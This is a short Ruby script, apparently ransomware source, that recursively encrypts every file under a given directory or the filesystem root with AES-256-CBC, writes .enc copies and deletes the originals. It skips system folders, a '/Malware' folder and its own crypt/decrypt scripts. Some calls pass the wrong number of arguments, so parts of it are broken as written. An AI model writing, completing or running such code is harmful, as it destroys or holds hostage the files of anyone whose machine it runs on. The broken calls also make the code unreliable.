require 'openssl'
require 'fileutils'

def encrypt_file(input_file, output_file, password)
    cipher = OpenSSL::Cipher.new('aes-256-cbc')
    cipher.encrypt
    cipher.key = OpenSSL::Digest::SHA256.new(password).digest
    iv = cipher.random_iv
  
    File.open(output_file, 'wb') do |encrypted_file|
      encrypted_file.write iv
      File.open(input_file, 'rb') do |plain_file|
        while chunk = plain_file.read(4096)
          encrypted_file.write cipher.update(chunk)
        end
        encrypted_file.write cipher.final
      end
    end
  end

def crypt_from_path(repertoire, password)
    # Liste des dossiers à exclure
    dossiers_exclus = ["/System", "/Applications", "/bin", "/sbin", "/usr/bin", "/usr/sbin", "/etc", "C:\\Program Files", "C:\\Program Files (x86)", "C:\\Windows\\System32","/Malware"]
    fichiers_exclus = ["crypt.rb", "decrypt.rb"]

    Dir.foreach(repertoire) do |fichier|
      chemin = File.join(repertoire, fichier)
      next if dossiers_exclus.any? { |dossier| chemin.start_with?(dossier) }
      next if File.extname(chemin) == ".enc"
      next if fichiers_exclus.include?(fichier)
      if File.file?(chemin) 
        input_file = File.join(repertoire, fichier)
        output_file = File.join("#{repertoire}", "#{fichier}.enc")
        puts output_file
        encrypt_file(input_file, output_file, password)
        File.delete(input_file)
      end
      crypt_from_path(chemin, password) if File.directory?(chemin) && fichier != "." && fichier != ".."
    end
end
  
if ARGV.size == 1 then crypt_from_path("/")
else 
    input = ARGV[0]
    password = ARGV[1]
    if File.file?(input) then encrypt_file(input,"#{input}.enc", password)
    else crypt_from_path(input)
    end
end
